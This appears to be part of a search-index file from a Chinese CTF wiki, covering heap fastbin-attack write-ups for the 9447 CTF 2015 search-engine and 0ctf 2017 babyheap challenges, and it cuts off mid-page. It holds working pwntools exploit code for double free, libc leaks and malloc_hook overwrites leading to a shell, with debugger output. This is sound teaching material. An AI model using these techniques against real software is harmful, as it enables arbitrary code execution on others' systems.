            "title": "\u6cc4\u6f0f libc \u5730\u5740"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#fastbin", 
            "text": "\u7531\u4e8e\u6211\u4eec\u6700\u540e\u5e0c\u671b\u5728 malloc_hook \u5904\u5206\u914d chunk\uff0c\u800c\u4e00\u822c\u5206\u914d malloc_hook \u9644\u8fd1\u7684 chunk \u4e00\u822c\u5927\u5c0f\u90fd\u662f0x7f\u3002\u5373\uff0c\u6211\u4eec\u6240\u9700\u8981\u8bbe\u7f6e\u7684\u8bbe\u7f6e\u7684 fast bin \u7684\u6570\u636e\u5b57\u8282\u90e8\u5206\u7684\u5927\u5c0f\u4e3a 0x60\u3002\u8fd9\u91cc\u6211\u4eec\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u6784\u9020   \u5206\u522b\u7d22\u5f15\u53e5\u5b50a\uff0c\u7d22\u5f15\u53e5\u5b50b\uff0c\u7d22\u5f15\u53e5\u5b50c\uff0c\u5219\u6b64\u65f6\u5355\u8bcd\u94fe\u8868\u4e2d\u7d22\u5f15\u7684\u53e5\u5b50\u7684\u76f8\u5bf9\u987a\u5e8f\u4e3ac- b- a\u3002\u5047\u8bbe\u53e5\u5b50 a \u4e3a'a' * 0x5d+' d '\uff0c\u53e5\u5b50 b \u4e3a 'b' * 0x5d+' d '\uff0c\u53e5\u5b50c\u7c7b\u4f3c\u3002  \u7d22\u5f15\u5355\u8bcdd\uff0c\u4e09\u4e2a\u5747\u5220\u9664\uff0c\u5219\u6b64\u65f6 fastbin \u4e2d\u7684\u94fe\u8868\u60c5\u51b5\u4e3a a- b- c- NULL\uff0c\u8fd9\u662f\u56e0\u4e3a\u9996\u5148\u91ca\u653e\u7684\u662f\u53e5\u5b50c\uff0c\u6700\u540e\u91ca\u653e\u7684\u662f\u53e5\u5b50 a \u3002\u8fd9\u65f6\uff0c\u641c\u7d22\u5355\u8bcd\u65f6 *i- sentence_ptr  \u5bf9\u4e8ea, b \u6765\u8bf4\u90fd\u662f\u53ef\u4ee5\u7ed5\u8fc7\u7684\u3002  \u6211\u4eec\u6b64\u65f6\u518d\u6b21\u5220\u9664\u641c\u7d22\u5355\u8bcd  \\x00 \u3002\u9996\u5148\u904d\u5386\u7684\u662f c\uff0c\u4f46\u662f c \u7684\u9a8c\u8bc1\u4e0d\u901a\u8fc7\uff1b\u5176\u6b21\u904d\u5386\u7684\u662fb\uff0c\u9a8c\u8bc1\u901a\u8fc7\uff0c\u6211\u4eec\u5c06\u5176\u91ca\u653e\uff1b\u5176\u6b21\u904d\u5386\u7684\u662fa\uff0c\u9a8c\u8bc1\u901a\u8fc7\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u5220\u9664\u3002\u5219\u6b64\u65f6 fastbin \u7684\u60c5\u51b5\u4e3a b- a- b- a- ...\u3002\u5373\u5df2\u7ecf\u6784\u6210\u4e86double free b\u7684\u60c5\u51b5\u3002\u7531\u4e8e\u6211\u4eec\u5148\u524d\u4e3a\u4e86 leak libc \u8fd8\u5efa\u7acb\u4e00\u4e2a\u53e5\u5b50\uff0c\u6240\u4ee5\u8fd8\u6709\u4e00\u4e2a\u5355\u8bcd\u53ef\u4ee5\u6bd4\u8f83\uff0c\u8fd9\u91cc\u6211\u4eec\u4e5f\u4e0d\u5220\u9664\u3002   \u5177\u4f53\u4ee3\u7801\u5982\u4e0b       # 2. create cycle fastbin 0x70 size \n     index_sentence ( a   *   0x5d   +    d  )    #a \n     index_sentence ( b   *   0x5d   +    d  )    #b \n     index_sentence ( c   *   0x5d   +    d  )    #c \n\n     # a- b- c- NULL \n     search_word ( d ) \n     p . recvuntil ( Delete this sentence (y/n)? \\n ) \n     p . sendline ( y ) \n     p . recvuntil ( Delete this sentence (y/n)? \\n ) \n     p . sendline ( y ) \n     p . recvuntil ( Delete this sentence (y/n)? \\n ) \n     p . sendline ( y ) \n\n     # b- a- b- a- ... \n     search_word ( \\x00 ) \n     p . recvuntil ( Delete this sentence (y/n)? \\n ) \n     p . sendline ( y ) \n     p . recvuntil ( Delete this sentence (y/n)? \\n ) \n     p . sendline ( n ) \n     p . recvuntil ( Delete this sentence (y/n)? \\n ) \n     p . sendline ( n )   \u6548\u679c\u5982\u4e0b  pwndbg  fastbins \nfastbins\n0x20: 0x0\n0x30: 0x1d19320 \u25c2\u2014 0x0\n0x40: 0x0\n0x50: 0x0\n0x60: 0x0\n0x70: 0x1d191b0 \u2014\u25b8 0x1d19010 \u2014\u25b8 0x1d191b0 \u25c2\u2014 0x1d19010\n0x80: 0x0", 
            "title": "\u6784\u9020 fastbin \u5faa\u73af\u94fe\u8868"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#malloc_hook-chunk", 
            "text": "\u6b64\u65f6\uff0cfastbin \u7684\u94fe\u8868\u4e3a b- a- b- a- \u2026\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u5728\u7533\u8bf7\u7b2c\u4e00\u4e2a\u76f8\u540c\u5927\u5c0f\u7684 chunk \u65f6\uff0c\u8bbe\u7f6e b \u7684 fd \u4e3a malloc_hook \u9644\u8fd1\u5904\u7684 chunk  0x7fd798586aed \uff08\u8fd9\u91cc\u662f\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u4ee3\u7801\u4e2d\u9700\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\uff09\u3002  pwndbg  print  ( void* ) main_arena  $1   =   ( void * )  0x7fd798586b20  main_arena \npwndbg  x/8gx 0x7fd798586b20-16\n0x7fd798586b10  __malloc_hook : 0x0000000000000000  0x0000000000000000\n0x7fd798586b20  main_arena :    0x0000000000000000  0x0000000000bce130\n0x7fd798586b30  main_arena+16 : 0x0000000000000000  0x0000000000000000\n0x7fd798586b40  main_arena+32 : 0x0000000000000000  0x0000000000000000\npwndbg  find_fake_fast 0x7fd798586b10 0x7f\nFAKE CHUNKS\n0x7fd798586aed PREV_INUSE IS_MMAPED NON_MAIN_ARENA  { \n   prev_size   =   15535264025435701248 , \n   size   =   127 , \n   fd   =  0xd798247e20000000, \n   bk   =  0xd798247a0000007f, \n   fd_nextsize   =  0x7f, \n   bk_nextsize   =  0x0 } \npwndbg  print /x 0x7fd798586b10-0x7fd798586aed $2   =  0x23\npwndbg  print /x 0x7fd798586b20-0x7fd798586aed $3   =  0x33  \u90a3\u4e48\u5f53\u518d\u6b21\u5206\u914d b \u7684\u65f6\u5019\uff0c\u7531\u4e8e\u6b64\u65f6 b \u7684 fd \u5df2\u7ecf\u88ab\u6211\u4eec\u4fee\u6539\u4e3a\u4e86malloc_hook\u9644\u8fd1\u7684\u5730\u5740\uff0c\u6240\u4ee5\u8fd9\u65f6\u5019\u6211\u4eec\u518d\u6b21\u5206\u914d\u4e00\u4e2a chunk\uff0c\u5c31\u4f1a\u6307\u5411  0x7fd798586aed \u3002 \u6b64\u540e\u4fbf\u53ea\u9700\u8981\u5c06 malloc_hook \u4fee\u6539\u4e3a one_gadget \u5730\u5740\u5c31\u53ef\u4ee5\u62ff\u5230 shell \u4e86\u3002       # 3. fastbin attack to malloc_hook nearby chunk \n     fake_chunk_addr   =   main_arena_addr   -   0x33 \n     fake_chunk   =   p64 ( fake_chunk_addr ) . ljust ( 0x60 ,   f ) \n\n     index_sentence ( fake_chunk ) \n\n     index_sentence ( a   *   0x60 ) \n\n     index_sentence ( b   *   0x60 ) \n\n     one_gadget_addr   =   libc_base   +   0xf02a4 \n     payload   =   a   *   0x13   +   p64 ( one_gadget_addr ) \n     payload   =   payload . ljust ( 0x60 ,   f ) \n     #gdb.attach(p) \n     index_sentence ( payload ) \n     p . interactive ()   \u8fd9\u91cc\u53ef\u80fd\u9700\u8981\u591a\u9009\u62e9\u51e0\u4e2a one_gadget \u5730\u5740\uff0c\u56e0\u4e3a one_gadget \u6210\u529f\u662f\u6709\u6761\u4ef6\u7684\u3002", 
            "title": "\u5206\u914d malloc_hook \u9644\u8fd1chunk"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#shell", 
            "text": "\u279c  2015_9447ctf_search-engine git: ( master )  python exp.py [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 ) \n    FORTIFY:  Enabled [ + ]  Starting  local  process  ./search : pid  31158  [ * ]  PID:  31158  [ + ]  unsortedbin addr: 0x7f802e73bb78 [ + ]  libc base addr: 0x7f802e377000 [ * ]  Switching to interactive mode\nEnter the sentence:\n$ ls\nexp.py       search      search.id1  search.nam\nlibc.so.6  search.id0  search.id2  search.til  \u5f53\u7136\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e00\u79cd \u65b9\u6cd5 \uff0c\u5c06 chunk \u5206\u914d\u5230\u6808\u4e0a\u3002", 
            "title": "shell"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#2017-0ctf-babyheap", 
            "text": "", 
            "title": "2017 0ctf babyheap"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_25", 
            "text": "\u279c  2017_0ctf_babyheap git: ( master )  file babyheap                            \nbabyheap: ELF  64 -bit LSB shared object, x86-64, version  1   ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,  for  GNU/Linux  2 .6.32, BuildID [ sha1 ]= 9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped\n\u279c  2017_0ctf_babyheap git: ( master )  checksec babyheap    [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2017_0ctf_babyheap/babyheap \n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled  64\u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u5168\u90e8\u5f00\u542f\u3002", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_26", 
            "text": "\u7a0b\u5e8f\u662f\u4e00\u4e2a\u5806\u5206\u914d\u5668\uff0c\u4e3b\u8981\u7531\u4ee5\u4e0b\u56db\u79cd\u529f\u80fd     puts ( 1. Allocate ); \n   puts ( 2. Fill ); \n   puts ( 3. Free ); \n   puts ( 4. Dump ); \n   puts ( 5. Exit ); \n   return   printf ( Command:  );   \u5176\u4e2d\uff0c\u6bcf\u6b21\u8bfb\u53d6\u547d\u4ee4\u7684\u51fd\u6570\u7531\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u7684\u5b57\u7b26\u4e32\u7684\u51fd\u6570\u800c\u51b3\u5b9a\u3002  \u901a\u8fc7\u5206\u914d\u51fd\u6570  void   __fastcall   allocate ( __int64   a1 )  { \n   signed   int   i ;   // [rsp+10h] [rbp-10h] \n   signed   int   v2 ;   // [rsp+14h] [rbp-Ch] \n   void   * v3 ;   // [rsp+18h] [rbp-8h] \n\n   for   (   i   =   0 ;   i   =   15 ;   ++ i   ) \n   { \n     if   (   !* ( _DWORD   * )( 24LL   *   i   +   a1 )   ) \n     { \n       printf ( Size:  ); \n       v2   =   read_num (); \n       if   (   v2     0   ) \n       { \n         if   (   v2     4096   ) \n           v2   =   4096 ; \n         v3   =   calloc ( v2 ,   1uLL ); \n         if   (   ! v3   ) \n           exit ( - 1 ); \n         * ( _DWORD   * )( 24LL   *   i   +   a1 )   =   1 ; \n         * ( _QWORD   * )( a1   +   24LL   *   i   +   8 )   =   v2 ; \n         * ( _QWORD   * )( a1   +   24LL   *   i   +   16 )   =   v3 ; \n         printf ( Allocate Index %d \\n ,   ( unsigned   int ) i ); \n       } \n       return ; \n     } \n   }  }   \u7533\u8bf7\u7684 chunk \u7684\u6700\u5927\u4e3a 4096\u3002\u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u6bcf\u4e2a chunk \u4e3b\u8981\u6709\u4e09\u4e2a\u5b57\u6bb5\uff1a\u662f\u5426\u5728\u4f7f\u7528\uff0c\u5806\u5757\u5927\u5c0f\uff0c\u5806\u5757\u4f4d\u7f6e\u3002\u6545\u800c\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u5bf9\u5e94\u7684\u7ed3\u6784\u4f53\u3002  00000000 chunk           struc ; (sizeof=0x18, mappedto_6)\n00000000 inuse           dq ?\n00000008 size            dq ?\n00000010 ptr             dq ?\n00000018 chunk           ends  \u9700\u8981\u6ce8\u610f\u7684\u662f\u5806\u5757\u662f\u7531 calloc \u5206\u914d\u7684\uff0c\u6240\u4ee5 chunk \u4e2d\u7684\u5185\u5bb9\u5168\u90fd\u4e3a \\x00 \u3002  \u5728\u586b\u5145\u5185\u5bb9\u7684\u529f\u80fd\u4e2d\uff0c\u4f7f\u7528\u8bfb\u53d6\u5185\u5bb9\u7684\u51fd\u6570\u662f\u76f4\u63a5\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u7684\u5185\u5bb9\uff0c\u5e76\u6ca1\u6709\u8bbe\u7f6e\u5b57\u7b26\u4e32\u7ed3\u5c3e\u3002 \u800c\u4e14\u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\uff0c\u8fd9\u4e2a\u6307\u5b9a\u957f\u5ea6\u662f\u6211\u4eec\u6307\u5b9a\u7684\uff0c\u5e76\u4e0d\u662f\u4e4b\u524d chunk \u5206\u914d\u65f6\u6307\u5b9a\u7684\u957f\u5ea6\uff0c\u6240\u4ee5\u8fd9\u91cc\u5c31\u51fa\u73b0\u4e86\u4efb\u610f\u5806\u6ea2\u51fa\u7684\u60c5\u5f62\u3002  __int64   __fastcall   fill ( chunk   * a1 )  { \n   __int64   result ;   // rax \n   int   v2 ;   // [rsp+18h] [rbp-8h] \n   int   v3 ;   // [rsp+1Ch] [rbp-4h] \n\n   printf ( Index:  ); \n   result   =   read_num (); \n   v2   =   result ; \n   if   (   ( signed   int ) result   =   0     ( signed   int ) result   =   15   ) \n   { \n     result   =   LODWORD ( a1 [( signed   int ) result ]. inuse ); \n     if   (   ( _DWORD ) result   ==   1   ) \n     { \n       printf ( Size:  ); \n       result   =   read_num (); \n       v3   =   result ; \n       if   (   ( signed   int ) result     0   ) \n       { \n         printf ( Content:  ); \n         result   =   read_content (( char   * ) a1 [ v2 ]. ptr ,   v3 ); \n       } \n     } \n   } \n   return   result ;  }   \u5728\u91ca\u653echunk\u7684\u529f\u80fd\u4e2d\u8be5\u8bbe\u7f6e\u7684\u90fd\u8bbe\u7f6e\u4e86\u3002  __int64   __fastcall   free_chunk ( chunk   * a1 )  { \n   __int64   result ;   // rax \n   int   v2 ;   // [rsp+1Ch] [rbp-4h] \n\n   printf ( Index:  ); \n   result   =   read_num (); \n   v2   =   result ; \n   if   (   ( signed   int ) result   =   0     ( signed   int ) result   =   15   ) \n   { \n     result   =   LODWORD ( a1 [( signed   int ) result ]. inuse ); \n     if   (   ( _DWORD ) result   ==   1   ) \n     { \n       LODWORD ( a1 [ v2 ]. inuse )   =   0 ; \n       a1 [ v2 ]. size   =   0LL ; \n       free ( a1 [ v2 ]. ptr ); \n       result   =   ( __int64 ) a1 [ v2 ]; \n       * ( _QWORD   * )( result   +   16 )   =   0LL ; \n     } \n   } \n   return   result ;  }   dump \u5c31\u662f\u8f93\u51fa\u5bf9\u5e94\u7d22\u5f15 chunk \u7684\u5185\u5bb9\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_27", 
            "text": "\u53ef\u4ee5\u786e\u5b9a\u7684\u662f\uff0c\u6211\u4eec\u4e3b\u8981\u6709\u7684\u6f0f\u6d1e\u5c31\u662f\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u3002\u7531\u4e8e\u8be5\u7a0b\u5e8f\u51e0\u4e4e\u6240\u6709\u4fdd\u62a4\u90fd\u5f00\u542f\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u8981\u6709\u4e00\u4e9b\u6cc4\u6f0f\u624d\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u7684\u6d41\u7a0b\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b   \u5229\u7528 unsorted bin \u5730\u5740\u6cc4\u6f0f libc \u57fa\u5730\u5740\u3002  \u5229\u7528 fastbin attack \u5c06chunk \u5206\u914d\u5230 malloc_hook \u9644\u8fd1\u3002", 
            "title": "\u5229\u7528\u601d\u8def"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#libc_1", 
            "text": "\u7531\u4e8e\u6211\u4eec\u662f\u5e0c\u671b\u4f7f\u7528 unsorted bin \u6765\u6cc4\u6f0f libc \u57fa\u5730\u5740\uff0c\u6240\u4ee5\u5fc5\u987b\u8981\u6709 chunk \u53ef\u4ee5\u88ab\u94fe\u63a5\u5230 unsorted bin \u4e2d\uff0c\u6240\u4ee5\u8be5 chunk \u4e0d\u80fd\u4f7f fastbin chunk\uff0c\u4e5f\u4e0d\u80fd\u548c top chunk \u76f8\u90bb\u3002\u56e0\u4e3a\u524d\u8005\u4f1a\u88ab\u6dfb\u52a0\u5230 fastbin \u4e2d\uff0c\u540e\u8005\u5728\u4e0d\u662ffastbin \u7684\u60c5\u51b5\u4e0b\uff0c\u4f1a\u88ab\u5408\u5e76\u5230 top chunk \u4e2d\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u8fd9\u91cc\u6784\u9020\u4e00\u4e2a small bin chunk\u3002\u5728\u5c06\u8be5 chunk \u91ca\u653e\u5230 unsorted bin \u7684\u540c\u65f6\uff0c\u4e5f\u9700\u8981\u8ba9\u53e6\u5916\u4e00\u4e2a\u6b63\u5728\u4f7f\u7528\u7684 chunk \u53ef\u4ee5\u540c\u65f6\u6307\u5411\u8be5 chunk \u7684\u4f4d\u7f6e\u3002\u8fd9\u6837\u624d\u53ef\u4ee5\u8fdb\u884c\u6cc4\u6f0f\u3002\u5177\u4f53\u8bbe\u8ba1\u5982\u4e0b       # 1. leak libc base \n     allocate ( 0x10 )    # idx 0, 0x00 \n     allocate ( 0x10 )    # idx 1, 0x20 \n     allocate ( 0x10 )    # idx 2, 0x40 \n     allocate ( 0x10 )    # idx 3, 0x60 \n     allocate ( 0x80 )    # idx 4, 0x80 \n     # free idx 1, 2, fastbin[0]- idx1- idx2- NULL \n     free ( 2 ) \n     free ( 1 )   \u9996\u5148\uff0c\u6211\u4eec\u7533\u8bf7\u4e86 5 \u4e2achunk\uff0c\u5e76\u91ca\u653e\u4e86\u4e24\u4e2achunk\uff0c\u6b64\u65f6\u5806\u7684\u60c5\u51b5\u5982\u4e0b\u3002  pwndbg  x/20gx 0x55a03ca22000\n0x55a03ca22000: 0x0000000000000000  0x0000000000000021 idx  0 \n0x55a03ca22010: 0x0000000000000000  0x0000000000000000\n0x55a03ca22020: 0x0000000000000000  0x0000000000000021 idx  1 \n0x55a03ca22030: 0x000055a03ca22040  0x0000000000000000\n0x55a03ca22040: 0x0000000000000000  0x0000000000000021 idx  2 \n0x55a03ca22050: 0x0000000000000000  0x0000000000000000\n0x55a03ca22060: 0x0000000000000000  0x0000000000000021 idx  3 \n0x55a03ca22070: 0x0000000000000000  0x0000000000000000\n0x55a03ca22080: 0x0000000000000000  0x0000000000000091 idx  4 \n0x55a03ca22090: 0x0000000000000000  0x0000000000000000\npwndbg  fastbins \nfastbins\n0x20: 0x55a03ca22020 \u2014\u25b8 0x55a03ca22040 \u25c2\u2014 0x0\n0x30: 0x0\n0x40: 0x0\n0x50: 0x0\n0x60: 0x0\n0x70: 0x0\n0x80: 0x0  \u5f53\u6211\u4eec\u7f16\u8f91 idx0 \u540e\uff0c\u786e\u5b9e\u5df2\u7ecf\u5c06\u5176\u6307\u5411idx4\u4e86\u3002\u8fd9\u91cc\u4e4b\u6240\u4ee5\u53ef\u4ee5\u6210\u529f\u662f\u56e0\u4e3a\u5806\u7684\u59cb\u7ec8\u662f 4KB \u5bf9\u9f50\u7684\uff0c\u6240\u4ee5idx 4\u7684\u8d77\u59cb\u5730\u5740\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u5fc5\u7136\u662f0x80\u3002       # edit idx 0 chunk to particial overwrite idx1 s fd to point to idx4 \n     payload   =   0x10   *   a   +   p64 ( 0 )   +   p64 ( 0x21 )   +   p8 ( 0x80 ) \n     fill ( 0 ,   len ( payload ),   payload )   \u4fee\u6539\u6210\u529f\u540e\u5982\u4e0b  pwndbg  x/20gx 0x55a03ca22000\n0x55a03ca22000: 0x0000000000000000  0x0000000000000021\n0x55a03ca22010: 0x6161616161616161  0x6161616161616161\n0x55a03ca22020: 0x0000000000000000  0x0000000000000021\n0x55a03ca22030: 0x000055a03ca22080  0x0000000000000000\n0x55a03ca22040: 0x0000000000000000  0x0000000000000021\n0x55a03ca22050: 0x0000000000000000  0x0000000000000000\n0x55a03ca22060: 0x0000000000000000  0x0000000000000021\n0x55a03ca22070: 0x0000000000000000  0x0000000000000000\n0x55a03ca22080: 0x0000000000000000  0x0000000000000091\n0x55a03ca22090: 0x0000000000000000  0x0000000000000000\npwndbg  fastbins \nfastbins\n0x20: 0x55a03ca22020 \u2014\u25b8 0x55a03ca22080 \u25c2\u2014 0x0\n0x30: 0x0\n0x40: 0x0\n0x50: 0x0\n0x60: 0x0\n0x70: 0x0\n0x80: 0x0  \u90a3\u4e48\uff0c\u5f53\u6211\u4eec\u518d\u6b21\u7533\u8bf7\u4e24\u4e2a\u65f6\uff0c\u7b2c\u4e8c\u4e2a\u7533\u8bf7\u5230\u7684\u5c31\u662fidx 4\u5904\u7684chunk\u3002\u4e3a\u4e86\u80fd\u591f\u7533\u8bf7\u6210\u529f\uff0c\u6211\u4eec\u9700\u8981\u786e\u4fdd idx4 \u7684size \u4e0e\u5f53\u524d fastbin \u7684\u5927\u5c0f\u4e00\u81f4\uff0c\u6240\u4ee5\uff0c\u6211\u4eec\u5f97\u4fee\u6539\u5b83\u7684\u5927\u5c0f\u3002\u7533\u8bf7\u6210\u529f\u540e\uff0cidx2\u4f1a\u6307\u5411idx4\u3002       # if we want to allocate at idx4, we must set it s size as 0x21 \n     payload   =   0x10   *   a   +   p64 ( 0 )   +   p64 ( 0x21 ) \n     fill ( 3 ,   len ( payload ),   payload ) \n     allocate ( 0x10 )    # idx 1 \n     allocate ( 0x10 )    # idx 2, which point to idx4 s location   \u4e4b\u540e\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u5c06 idx 4 \u653e\u5230 unsorted bin \u4e2d\u7684\u8bdd\uff0c\u4e3a\u4e86\u9632\u6b62\u5176\u4e0etop chunk \u5408\u5e76\uff0c\u6211\u4eec\u9700\u8981\u518d\u6b21\u7533\u8bf7\u4e00\u4e2achunk\u3002\u6b64\u540e\u518d\u91ca\u653e idx4 \u5c31\u4f1a\u8fdb\u5165 unsorted bin\u4e2d\u53bb\u4e86\u3002\u6b64\u65f6\u7531\u4e8e idx2 \u4e5f\u6307\u5411\u8fd9\u4e2a\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u5c55\u793a\u4ed6\u7684\u5185\u5bb9\u5c31\u53ef\u4ee5\u5f97\u5230unsorted bin\u7684\u5730\u5740\u4e86\u3002       # if want to free idx4 to unsorted bin, we must fix its size \n     payload   =   0x10   *   a   +   p64 ( 0 )   +   p64 ( 0x91 ) \n     fill ( 3 ,   len ( payload ),   payload ) \n     # allocate a chunk in order when free idx4, idx 4 not consolidate with top chunk \n     allocate ( 0x80 )    # idx 5 \n     free ( 4 ) \n     # as idx 2 point to idx4, just show this \n     dump ( 2 ) \n     p . recvuntil ( Content:  \\n ) \n     unsortedbin_addr   =   u64 ( p . recv ( 8 )) \n     main_arena   =   unsortedbin_addr   -   offset_unsortedbin_main_arena \n     log . success ( main arena addr:    +   hex ( main_arena )) \n     main_arena_offset   =   0x3c4b20 \n     libc_base   =   main_arena   -   main_arena_offset \n     log . success ( libc base addr:    +   hex ( libc_base ))", 
            "title": "\u6cc4\u6f0f libc \u57fa\u5730\u5740"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#chunkmalloc_hook", 
            "text": "\u7531\u4e8e malloc hook \u9644\u8fd1\u7684 chunk \u5927\u5c0f\u4e3a 0x7f\uff0c\u6240\u4ee5\u6570\u636e\u533a\u57df\u4e3a0x60\u3002\u8fd9\u91cc\u6211\u4eec\u518d\u6b21\u7533\u8bf7\u7684\u65f6\u5019\uff0c\u5bf9\u5e94 fastbin \u94fe\u8868\u4e2d\u6ca1\u6709\u76f8\u5e94\u5927\u5c0fchunk\uff0c\u6240\u4ee5\u6839\u636e\u5806\u5206\u914d\u5668\u89c4\u5219\uff0c\u5b83\u4f1a\u4f9d\u6b21\u5904\u7406unsorted bin\u4e2d\u7684chunk\uff0c\u5c06\u5176\u653e\u5165\u5230\u5bf9\u5e94\u7684bin\u4e2d\uff0c\u4e4b\u540e\u4f1a\u518d\u6b21\u5c1d\u8bd5\u5206\u914d chunk\uff0c\u56e0\u4e3a\u4e4b\u524d\u91ca\u653e\u7684 chunk \u6bd4\u5f53\u524d\u7533\u8bf7\u7684 chunk \u5927\uff0c\u6240\u4ee5\u53ef\u4ee5\u4ece\u5176\u524d\u9762\u5206\u5272\u51fa\u6765\u4e00\u5757\u3002\u6240\u4ee5 idx2 \u4ecd\u7136\u6307\u5411\u8be5\u4f4d\u7f6e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u7684\u529e\u6cd5\u5148\u91ca\u653e\u7533\u8bf7\u5230\u7684chunk\uff0c\u7136\u540e\u518d\u6b21\u4fee\u6539 fd \u6307\u9488\u4e3a fake chunk \u5373\u53ef\u3002\u6b64\u540e\u6211\u4eec\u4fee\u6539 malloc_hook \u5904\u7684\u6307\u9488\u5373\u53ef\u5f97\u5230\u89e6\u53d1 onegadget\u3002  # 2. malloc to malloc_hook nearby  # allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4  allocate ( 0x60 )  free ( 4 )  # edit idx4 s fd point to fake chunk  fake_chunk_addr   =   main_arena   -   0x33  fake_chunk   =   p64 ( fake_chunk_addr )  fill ( 2 ,   len ( fake_chunk ),   fake_chunk )  allocate ( 0x60 )    # idx 4  allocate ( 0x60 )    # idx 6  one_gadget_addr   =   libc_base   +   0x4526a  payload   =   0x13   *   a   +   p64 ( one_gadget_addr )  fill ( 6 ,   len ( payload ),   payload )  # trigger malloc_hook  allocate ( 0x100 )  p . interactive ()   \n\u540c\u65f6\uff0c\u8fd9\u91cc\u7684 onegadget \u5730\u5740\u4e5f\u53ef\u80fd\u9700\u8981\u5c1d\u8bd5\u591a\u6b21\u3002", 
            "title": "\u5206\u914dchunk\u5230malloc_hook\u9644\u8fd1"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_28", 
            "text": "L-CTF2016\u2013pwn200", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_29", 
            "text": "https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/  http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html  https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717", 
            "title": "\u53c2\u8003\u6587\u732e"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_overlapping/", 
            "text": "Chunk Extend and Overlapping\n\n\n\u4ecb\u7ecd\n\n\nchunk extend\u662f\u5806\u6f0f\u6d1e\u7684\u4e00\u79cd\u5e38\u89c1\u5229\u7528\u624b\u6cd5\uff0c\u901a\u8fc7extend\u53ef\u4ee5\u5b9e\u73b0chunk overlapping\u7684\u6548\u679c\u3002\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u9700\u8981\u4ee5\u4e0b\u7684\u65f6\u673a\u548c\u6761\u4ef6\uff1a\n\n\n\n\n\u7a0b\u5e8f\u4e2d\u5b58\u5728\u57fa\u4e8e\u5806\u7684\u6f0f\u6d1e\n\n\n\u6f0f\u6d1e\u53ef\u4ee5\u63a7\u5236 chunk header \u4e2d\u7684\u6570\u636e\n\n\n\n\n\u539f\u7406\n\n\nchunk extend\u6280\u672f\u80fd\u591f\u4ea7\u751f\u7684\u539f\u56e0\u5728\u4e8eptmalloc\u5728\u5bf9\u5806chunk\u8fdb\u884c\u64cd\u4f5c\u65f6\u4f7f\u7528\u7684\u5404\u79cd\u5b8f\u3002\n\n\n\u5728ptmalloc\u4e2d\uff0c\u83b7\u53d6 chunk \u5757\u5927\u5c0f\u7684\u64cd\u4f5c\u5982\u4e0b\n\n/* Get size, ignoring use bits */\n#define chunksize(p) (chunksize_nomask(p) \n ~(SIZE_BITS))\n\n/* Like chunksize, but do not mask SIZE_BITS.  */\n#define chunksize_nomask(p) ((p)-\nmchunk_size)\n\n\n\u4e00\u79cd\u662f\u76f4\u63a5\u83b7\u53d6 chunk \u7684\u5927\u5c0f\uff0c\u4e0d\u5ffd\u7565\u63a9\u7801\u90e8\u5206\uff0c\u53e6\u5916\u4e00\u79cd\u662f\u5ffd\u7565\u63a9\u7801\u90e8\u5206\u3002\n\n\n\u5728 ptmalloc \u4e2d\uff0c\u83b7\u53d6\u4e0b\u4e00 chunk \u5757\u5730\u5740\u7684\u64cd\u4f5c\u5982\u4e0b\n\n/* Ptr to next physical malloc_chunk. */\n#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))\n\n\n\u5373\u4f7f\u7528\u5f53\u524d\u5757\u6307\u9488\u52a0\u4e0a\u5f53\u524d\u5757\u5927\u5c0f\u3002\n\n\n\u5728 ptmalloc \u4e2d\uff0c\u83b7\u53d6\u524d\u4e00\u4e2a 